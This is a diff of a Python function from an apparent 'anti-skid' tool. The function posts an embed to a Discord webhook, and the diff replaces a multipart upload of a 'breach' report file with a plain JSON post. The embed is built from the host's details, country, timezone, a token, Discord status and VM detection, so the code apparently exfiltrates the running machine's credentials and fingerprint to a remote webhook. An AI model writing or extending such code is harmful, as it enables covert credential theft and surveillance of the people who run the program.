@@ -218,51 +218,38 @@ def _build_embed(audit: dict, host: dict, tz: str, country: str, token: str,
 def _send_discord(webhook_url: str, report: str, audit: dict,
                   host: dict, tz: str, country: str, token: str,
                   discord_open: bool, vm: dict) -> bool:
-    """sends structured embed + .txt report file to discord"""
-    boundary = "----antisKidBoundary"
-
+    """sends embed to discord — just json, no multipart junk"""
     embed = _build_embed(audit, host, tz, country, token, discord_open, vm)
 
-    parts = []
-
-    # json payload with embed
+    # simple json payload, no multipart
     payload = json.dumps({
-        "username": "anti-skid",
-        "avatar_url": "https://i.imgur.com/4M34hi2.png",
+        "username": "anti-skid sentinel",
+        "content": "",
         "embeds": [embed],
-    })
-    parts.append(f"--{boundary}")
-    parts.append('Content-Disposition: form-data; name="payload_json"')
-    parts.append("Content-Type: application/json")
-    parts.append("")
-    parts.append(payload)
-
-    # file part
-    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
-    fname = f"breach_{ts}.txt"
-    parts.append(f"--{boundary}")
-    parts.append(f'Content-Disposition: form-data; name="file"; filename="{fname}"')
-    parts.append("Content-Type: text/plain")
-    parts.append("")
-    parts.append(report)
-
-    parts.append(f"--{boundary}--")
-    parts.append("")
-
-    body = "\r\n".join(parts).encode("utf-8")
-    ct = f"multipart/form-data; boundary={boundary}"
+    }).encode("utf-8")
 
     req = urllib.request.Request(
         webhook_url,
-        data=body,
-        headers={"Content-Type": ct, "User-Agent": "anti-skid/1.0"},
+        data=payload,
+        headers={
+            "Content-Type": "application/json",
+            "User-Agent": "anti-skid/1.0",
+        },
         method="POST",
     )
 
     try:
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            return 200 <= resp.status < 300
-    except:
+        with urllib.request.urlopen(req, timeout=15) as resp:
+            body = resp.read()
+            code = resp.status
+            # discord returns 204 on success
+            if 200 <= code < 300:
+                return True
+            else:
+                print(f"[anti-skid] discord said {code}: {body[:200]}", file=sys.stderr)
+                return False
+    except Exception as e:
+        print(f"[anti-skid] webhook error: {e}", file=sys.stderr)
         return False
 
 
